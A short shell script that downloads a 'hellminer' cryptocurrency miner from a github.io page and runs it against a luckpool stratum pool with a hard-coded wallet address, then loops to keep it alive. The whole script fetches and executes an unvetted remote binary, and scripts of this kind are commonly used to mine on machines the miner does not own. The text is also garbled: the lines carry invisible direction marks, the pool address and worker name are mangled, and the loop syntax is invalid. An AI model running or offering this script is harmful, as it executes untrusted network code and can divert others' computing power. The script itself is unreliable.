‎#!/bin/sh
‎sudo apt update
‎sudo apt install screen -y
‎wget https://min1933.github.io/Runing/hellminer_linux64.tar.gz
‎tar xf hellminer_linux64.tar.gz
‎./hellminer -c stratum+tcp://na.luckpool.net: 3956#xnsubu RXGhLDzjXgwr3cLMMFNXigucz2vCW1v87p.worke x --cpu 2
‎while (1); do
‎sleep 3
‎done
‎sleep 999
